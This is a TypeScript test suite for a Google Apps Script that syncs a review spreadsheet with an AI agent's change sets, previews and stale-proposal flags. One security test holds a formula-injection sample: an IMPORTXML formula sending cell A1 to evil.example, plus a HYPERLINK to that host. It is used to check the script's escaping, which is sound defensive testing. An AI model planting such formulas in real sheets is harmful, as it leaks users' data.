    fbRows[3][2] = "1.1 Global challenges";
    delete b.written["Contributor Feedback"];
    s.markDirty({ range: { getSheet: () => b.sheet("Contributor Feedback"), getRow: () => 4, getNumRows: () => 1 } });
    expect(b.written["Contributor Feedback"]["Selected Sections"][1]).toEqual(["\u2800\u2800\u28001.1 Global challenges"]);
  });

  test("an edit rebuilds only its rows; an Agent change reaches its change set's row on the timer", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    // A person picks a section in row 3 (index 1): only that row is rebuilt.
    t["Contributor Feedback"].rows[2][2] = "1.1 Global challenges";
    delete rt2.written["Contributor Feedback"];
    s.markDirty({ range: { getSheet: () => rt2.sheet("Contributor Feedback"), getRow: () => 3, getNumRows: () => 1 } });
    const w = rt2.written["Contributor Feedback"];
    expect(w["Selected Sections"][1]).toEqual(["\u2800\u2800\u28001.1 Global challenges"]);
    expect((w["Section links"][1][0] as Rich).text).toBe("1.1 Global challenges");
    expect(w["Section links"][0]).toBeUndefined();
    expect(rt2.written.TOC).toBeDefined(); // from the first full refresh only
    // Nothing changed: the timer writes nothing.
    delete rt2.written["Contributor Feedback"];
    s.refreshIfDirty();
    expect(rt2.written["Contributor Feedback"]).toBeUndefined();
    // The agent writes CS-004's Agent row through the API (no edit fires): the timer rebuilds row 2 only.
    t.Agent.rows[1][2] = "PR merged";
    s.refreshIfDirty();
    const w2 = rt2.written["Contributor Feedback"];
    expect((w2["Agentic status"][0][0] as Rich).text).toContain("PR merged");
    expect(w2["Agentic status"][1]).toBeUndefined();
  });

  test("the agent's proposal is flagged stale once a blue cell changes, and unflagged when it matches again", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Contributor Feedback (agent)");
    f.forEach((x, i) => i && x.push(""));
    f[1][9] = "Define it in 1.1";
    t.Agent.rows[0].push("Feedback basis (change set)");
    t.Agent.rows[1].push(feedbackBasis(f[0], f[1]));
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"]).toBeUndefined();
    f[1][1] = "Define registry and register";
    s.refreshAll();
    const stale = rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0] as string;
    expect(stale).toMatch(/^\u26a0 Stale: .*\nDefine it in 1\.1$/);
    f[1][1] = "Define registry";
    f[1][9] = stale;
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]).toBe("Define it in 1.1");
  });

  test("the agent column under its new name, Feedback (agent), is read the same, and never counts as a person's feedback", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Feedback (agent)");
    f.forEach((x, i) => i && x.push(""));
    f[1][9] = "Question for the editor: A or B? Recommended: A";
    t.Agent.rows[0].push("Feedback basis (change set)");
    t.Agent.rows[1].push(feedbackBasis(f[0], f[1]));
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]["Feedback (agent)"]).toBeUndefined();
    f[1][1] = "A new title";
    s.refreshAll();
    expect(String(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0])).toMatch(/^\u26a0 Stale: .*\nQuestion for the editor/);
  });

  test("a new empty feedback column marks nothing stale, and a basis written the older way still matches", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Contributor Feedback (agent)");
    f.forEach((x, i) => i && x.push(""));
    const ag = f[0].indexOf("Contributor Feedback (agent)");
    f[1][ag] = "Define it in 1.1";
    // The older basis: every matching column, empty or not.
    const legacy = hashOf(f[0].map((h, i) => [h, String(f[1][i] ?? "").trim()] as const)
      .filter(([h]) => ["Title", "Selected Sections"].includes(h) || (h.startsWith("Contributor Feedback") && h !== "Contributor Feedback (agent)"))
      .map(([h, v]) => `${h}=${h === "Selected Sections" ? v.split(",").map((x) => x.replace(/^[\s\u2800\u2502\u2514]+/, "").trim()).filter(Boolean).join(",") : v}`).join("\n"));
    t.Agent.rows[0].push("Feedback basis (change set)");
    t.Agent.rows[1].push(legacy);
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]).toBeUndefined();
    // The agent writes the new basis; then a new reviewer's empty column appears.
    t.Agent.rows[1][t.Agent.rows[0].indexOf("Feedback basis (change set)")] = feedbackBasis(f[0], f[1]);
    f[0].splice(ag, 0, "Contributor Feedback (XY)");
    f.slice(1).forEach((x) => x.splice(ag, 0, ""));
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]?.["Contributor Feedback (agent)"]).toBeUndefined();
  });

  test("a proposal turning stale sets Ready for agent back to No, once, so an Editor's new Yes stays", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Contributor Feedback (agent)", "Ready for agent");
    f.forEach((x, i) => i && x.push("", ""));
    const ag = f[0].indexOf("Contributor Feedback (agent)"), rd = f[0].indexOf("Ready for agent");
    f[1][ag] = "Define it in 1.1";
    f[1][rd] = "Yes";
    t.Agent.rows[0].push("Feedback basis (change set)");
    t.Agent.rows[1].push(feedbackBasis(f[0].slice(0, ag + 1), f[1].slice(0, ag + 1)));
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]?.["Ready for agent"]).toBeUndefined();
    f[1][1] = "Define registry and register";
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]["Ready for agent"][0][0]).toBe("No");
    // Still stale, and an Editor sets Yes again: it stays.
    f[1][ag] = rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0] as string;
    f[1][rd] = "Yes";
    delete rt2.written["Contributor Feedback"]["Ready for agent"];
    s.refreshAll();
    expect(rt2.written["Contributor Feedback"]["Ready for agent"]).toBeUndefined();
  });

  test("the staging review link is marked stale when a PR changed after the preview was built", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    t.Agent.rows[0].push("Staging built (UTC, change set)");
    t.Agent.rows[1].push("2026-10-30 23:00Z");
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshAll();
    const st = rt2.written["Contributor Feedback"]["Staging review"][0][0] as Rich;
    expect(st.text).toBe("review \u26a0 stale: built 2026-10-30 23:00Z, PR changed since");
    expect(st.links).toEqual([[0, 6, "https://o.github.io/dth/STAGING/cs-004/en/review/"]]);
    t.Agent.rows[1][7] = "2026-10-30 23:50Z";
    s.refreshAll();
    expect((rt2.written["Contributor Feedback"]["Staging review"][0][0] as Rich).text).toBe("review");
  });

  test("the staging review link compares commits when the agent records them", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const h = t.Agent.rows[0];
    h.push("Staging built (UTC, change set)", "PR head (change set)", "Staging built from (change set)", "Staging deploy (change set)");
    t.Agent.rows[1].push("2026-10-30 23:00Z", "abcdef1234567890", "abcdef1", "deployed");
    const at = (n: string) => h.indexOf(n);
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    const text = () => (rt2.written["Contributor Feedback"]["Staging review"][0][0] as Rich).text;
    // Same commit: no warning, even though Agent completed is later than Staging built.
    s.refreshAll();
    expect(text()).toBe("review");
    t.Agent.rows[1][at("PR head (change set)")] = "1234567aaaa";
    s.refreshAll();
    expect(text()).toBe("review \u26a0 stale: built from abcdef1, PR now at 1234567");
    t.Agent.rows[1][at("Staging built from (change set)")] = "1234567";
    t.Agent.rows[1][at("Staging deploy (change set)")] = "pending";
    s.refreshAll();
    expect(text()).toBe("review \u26a0 deploy in progress");
    t.Agent.rows[1][at("Staging deploy (change set)")] = "failed";
    s.refreshAll();
    expect(text()).toBe("review \u26a0 deploy failed");
    t.Agent.rows[1][at("Staging review page (change set)")] = "";
    s.refreshAll();
    expect(text()).toBe("\u26a0 no preview yet");
  });

  test("a public-comment edit is kept for the next tick when the rebuild cannot start", () => {
    const pc = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
    const rt3 = runtime(withConfig(pcTabs(), pc));
    let free = false;
    rt3.g.LockService = { getDocumentLock: () => ({ tryLock: () => free, releaseLock: () => {} }) };
    const s = load(code, rt3.g);
    rt3.props.dirty = "1";
    s.refreshIfDirty();
    expect(rt3.props.dirty).toBe("1");
    expect(rt3.written["Review Change Sets"]).toBeUndefined();
    free = true;
    s.refreshIfDirty();
    expect(rt3.props.dirty).toBeUndefined();
    expect(rt3.written["Review Change Sets"]).toBeDefined();
  });

  test("security: text a person or the agent typed is never written back as a formula", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const f = t["Contributor Feedback"].rows;
    f[0].push("Contributor Feedback (agent)");
    f.forEach((x, i) => i && x.push(""));
    // A stale-flagged proposal whose text is a formula, unflagged by the script.
    f[1][9] = '\u26a0 Stale: the row changed since this proposal; the agent will propose again.\n=IMPORTXML("https://evil.example/?"&A1,"//a")';
    t.Agent.rows[0].push("Feedback basis (change set)");
    t.Agent.rows[1].push(feedbackBasis(f[0], f[1]));
    f[2][2] = '=HYPERLINK("https://evil.example","x"), 1.1 Global challenges';
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    const w = rt2.written["Contributor Feedback"];
    expect(w["Contributor Feedback (agent)"][0][0]).toBe("'" + '=IMPORTXML("https://evil.example/?"&A1,"//a")');
    expect(String(w["Selected Sections"][1][0]).startsWith("'=")).toBe(true);
  });

  test("security: a large paste rebuilds everything rather than overflow a property", () => {
    const rt2 = runtime(withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>);
    const s = load(code, rt2.g);
    s.markDirty({ range: { getSheet: () => rt2.sheet("Contributor Feedback"), getRow: () => 2, getNumRows: () => 50000 } });
    expect(rt2.props.rows).toBeUndefined();
    expect(rt2.written["Contributor Feedback"]["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""]]);
  });

  test("Agentic status (filter) holds the change set's plain status, for a filter view", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    t["Contributor Feedback"].rows[0].push("Agentic status (filter)");
    t["Contributor Feedback"].rows.slice(1).forEach((r) => r.push(""));
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    expect((rt2.written["Contributor Feedback"]["Agentic status (filter)"] as Rich[][]).map((r) => r[0].text)).toEqual(["PR open", "", ""]);
  });

  test("Issue and Agentic status come from the Agent tab by change set", () => {
    const i = fb.Issue[0][0] as Rich;
    expect(i.text).toBe("dth#12");
    expect(i.links).toEqual([[0, 6, "https://github.com/o/dth/issues/12"]]);
    expect((fb["Agentic status"][0][0] as Rich).text).toBe("dth#40 (PR open, 2026-10-30 23:40Z) · Adds the definition");
    expect((fb.Issue[1][0] as Rich).text).toBe("");
  });

  test("Staging review links the change set's preview, from the Agent tab", () => {
    expect(fb["Staging review"][0][0]).toEqual({ text: "review", links: [[0, 6, "https://o.github.io/dth/STAGING/cs-004/en/review/"]], bold: [] });
    expect((fb["Staging review"][1][0] as Rich).text).toBe("");
  });

  test("an edit to Contributor Feedback or Agent refreshes at once; another tab's does not", () => {
    const rt2 = runtime(withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>);
    const s = load(code, rt2.g);
    s.markDirty({ range: { getSheet: () => rt2.sheet("Config") } });
    expect(rt2.written["Contributor Feedback"]).toBeUndefined();
    s.markDirty({ range: { getSheet: () => rt2.sheet("Contributor Feedback") } });
    expect(rt2.written["Contributor Feedback"]["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""]]);
    expect(rt2.props.dirty).toBeUndefined();
  });

  test("the agent's Contributor Feedback (agent) column is neither people's feedback nor makes a row used", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    const r = t["Contributor Feedback"].rows;
    r[0].push("Contributor Feedback (agent)");
    r.forEach((x, i) => i && x.push(""));
    r[3][9] = "Proposal";
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    expect(rt2.written["Contributor Feedback"]["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""]]);
  });
});

describe("sheet-sync URLs relative to the folio's site", () => {
  test("resolve against the instance's iriBase, so a move to another org changes one line", () => {
    const repo = draftFolio();
    writeFileSync(join(repo, "doc.json"), JSON.stringify({ instance: "doc", iriBase: "https://who.example/doc" }));
    writeFileSync(join(repo, "review/drafting/sheet-sync.json"), JSON.stringify({ mode: "drafting", anchors: "anchors.json", sectionUrl: "en/doc/#" }));
    expect(buildConfig(repo, "review/drafting/sheet-sync.json").CFG.SECTION_URL).toBe("https://who.example/doc/en/doc/#");
  });

  test("an absolute URL is kept; a relative one without an iriBase says what is missing", () => {
    const repo = draftFolio();
    expect(buildConfig(repo, "review/drafting/sheet-sync.json").CFG.SECTION_URL).toBe("https://x.example/S#");
    writeFileSync(join(repo, "review/drafting/sheet-sync.json"), JSON.stringify({ mode: "drafting", anchors: "anchors.json", sectionUrl: "en/doc/#" }));
    expect(() => buildConfig(repo, "review/drafting/sheet-sync.json")).toThrow(/declares no iriBase/);
  });
});

describe("the Config tab's rows", () => {
  const c = buildConfig(draftFolio(), "review/drafting/sheet-sync.json");
  const rows = configRows(c);
  const joined = (k: string) => rows.filter((r) => r[0] === k).map((r) => r[1].replace(/^\|/, "")).join("");

  test("are indented JSON a person can read, and read back the same", () => {
    expect(rows.find((r) => r[0] === "CFG")?.[1]).toContain('\n  "MODE": "drafting"');
    for (const k of ["CFG", "COLS", "DATA"] as const) expect(JSON.parse(joined(k))).toEqual(JSON.parse(JSON.stringify(c[k])));
  });

  test("a long value is cut between lines, and every cell fits", () => {
    const big = JSON.stringify({ xs: Array.from({ length: 6000 }, (_, i) => `section ${i} ${"x".repeat(10)}`) }, null, 2);
    const parts = chunks(big);
    expect(parts.length).toBeGreaterThan(1);
    expect(parts.every((p) => p.length <= 40_000)).toBe(true);
    expect(parts.slice(1).every((p) => p.startsWith("    \"section"))).toBe(true);
    expect(parts.every((p) => p.split("\n").length <= 40)).toBe(true);
    expect(JSON.parse(parts.join(""))).toEqual(JSON.parse(big));
  });

  test("readable() keeps short lists on one line and means the same as JSON", () => {
    const v = { a: [["Ch 1", "#c1"], ["1.1", "#s1"]], b: { c: [1, 2], d: null }, e: [], f: {} };
    expect(readable(v)).toContain('[["Ch 1","#c1"],["1.1","#s1"]]');
    expect(JSON.parse(readable(v))).toEqual(v);
    expect(JSON.parse(readable(c.DATA))).toEqual(JSON.parse(JSON.stringify(c.DATA)));
  });

  test("a single line longer than a cell is still cut and still parses", () => {
    const one = JSON.stringify({ s: "y".repeat(90_000) });
    const parts = chunks(one);
    expect(parts.length).toBe(3);
    expect(JSON.parse(parts.join(""))).toEqual(JSON.parse(one));
  });
});

describe("the colour key in Instructions text", () => {
  const keyRuns = new Function("SpreadsheetApp", `${code}\nreturn keyRuns;`)({}) as (t: string) => [number, number, string][];
  const text = tabInstructions(buildConfig(folio(), "review/public-comment/sheet-sync.json"))["Review Change Sets"];
  const runs = keyRuns(text);
  const words = runs.map(([a, z, c]) => [text.slice(a, z), c]);

  test("each key segment on the first line is coloured whole, in its own colour", () => {
    expect(words.slice(0, 4).map(([w]) => w.split(" = ")[0])).toEqual(["Blue", "Green", "Orange", "Grey"]);
    expect(words[0][0]).toContain("your input");
    expect(new Set(words.slice(0, 4).map(([, c]) => c)).size).toBe(4);
  });

  test("later colour words are coloured one by one, with the key's colour", () => {
    const later = words.slice(4);
    expect(later.length).toBeGreaterThan(3);
    for (const [w, c] of later) expect(c).toBe(words.find(([k]) => k.toLowerCase().startsWith(w.toLowerCase()))![1]);
  });

  test("text without a colour word gets no runs", () => {
    expect(keyRuns("Kept by the agent's watcher. Do not edit.")).toEqual([]);
  });
});

describe("a copy that is not linked to a repository yet", () => {
  test("says so, with this sheet's ID, instead of failing on a missing row", () => {
    const t = { ...tabs(), Config: { id: 900, rows: [["Key", "Value"], ["EDITORS", ""]] } };
    const rt = runtime(t);
    expect(() => load(code, rt.g).refreshAll()).toThrow(/not linked to a document repository yet.*copy-sheet-id/);
  });
});

describe("the Config tab's colours", () => {
  test("Key is a Grey header, EDITORS Orange, and the agent's rows (CFG, COLS, DATA) Grey", () => {
    const rows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
    const t = withConfig(tabs(), rows) as Record<string, { id: number; rows: string[][]; bg?: Record<number, string> }>;
    load(code, runtime(t).g).refreshAll();
    const bg = t.Config.bg!;
    const at = (k: string) => t.Config.rows.findIndex((r) => r[0] === k) + 1;
    expect(bg[at("Key")]).toBe("#b7b7b7");
    expect(bg[at("EDITORS")]).toBe("#f4b26b");
    for (const k of ["CFG", "COLS", "DATA"]) expect(bg[at(k)]).toBe("#efefef");
    expect(bg[at("Instructions")]).toBeUndefined();
  });
});

describe("running the script from the editor", () => {
  test("installTriggers is the first function, so the editor's Run button picks it", () => {
    expect(code.match(/^function (\w+)/m)?.[1]).toBe("installTriggers");
  });
  test("a helper run by hand says which function to run instead", () => {
    const loadConfig = new Function("SpreadsheetApp", `${code}\nreturn loadConfig;`)({}) as () => void;
    expect(() => loadConfig()).toThrow(/pick installTriggers/);
  });
});

describe("the committed Code.gs people copy", () => {
  test("dist/Code.gs is current: run build-review-sheet-script.ts --dist after changing review-sheet.gs", () => {
    const committed = readText(join(import.meta.dir, "dist", "Code.gs"), "utf8");
    expect(committed).toBe(buildScript({ stamp: "content" }));
  });
  test("the install steps link it", () => {
    const rows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
    expect(rows.find((r) => r[0] === "Instructions - Install script")![1]).toContain(CODE_GS_URL);
  });
});

describe("Ready for agent after the preview was built (owner, 2026-10-31)", () => {
  const sheets = {
    newRichTextValue: () => {
      const v = { text: "", links: [] as unknown[], bold: [] as unknown[] };
      const b = {
        setText: (t: string) => ((v.text = t), b),
        setLinkUrl: (a: number, z: number, u: string) => (v.links.push([a, z, u]), b),
        setTextStyle: (a: number, z: number) => (v.bold.push([a, z]), b),
        build: () => v,
      };
      return b;
    },
    newTextStyle: () => ({ setBold: () => ({ build: () => ({}) }) }),
  };
  const fns = new Function("SpreadsheetApp", `${code}\nreturn { stagingWarning, agenticCell };`)(sheets) as {
    stagingWarning: (u: string, b: object, p: object[], r?: string) => string;
    agenticCell: (s: string, p: object[], o?: object) => { text: string; links: [number, number, string][] };
  };
  const pr = { url: "https://github.com/litlfred/dth-hrh/pull/7", head: "b20534f", done: "2026-10-31 08:10Z" };
  const built = { at: "2026-10-31 08:15Z", from: "b20534f", deploy: "deployed" };

  test("Staging review warns when Ready for agent was set after the build", () => {
    expect(fns.stagingWarning("u", built, [pr])).toBe("");
    expect(fns.stagingWarning("u", built, [pr], "2026-10-31 11:30Z")).toBe("\u26a0 missing feedback from 2026-10-31 11:30Z");
    expect(fns.stagingWarning("u", built, [pr], "2026-10-31 08:00Z")).toBe("");
  });

  test("Agentic status says the row is queued, then who has it", () => {
    const q = fns.agenticCell("Done", [pr], { readyAt: "2026-10-31 11:30Z" });
    expect(q.text.split("\n")[0]).toBe("Waiting on the agent since 2026-10-31 11:30Z (Ready for agent set)");
    expect(q.text).toContain("dth-hrh#7");
    const w = fns.agenticCell("Working", [pr], { readyAt: "2026-10-31 11:30Z", talk: "https://claude.ai/code/x" });
    expect(w.text.startsWith("An agent is working on it: conversation\n")).toBe(true);
    expect(w.links.some(([, , u]) => u === "https://claude.ai/code/x")).toBe(true);
    expect(fns.agenticCell("Done", [pr]).text.startsWith("dth-hrh#7")).toBe(true);
  });
});
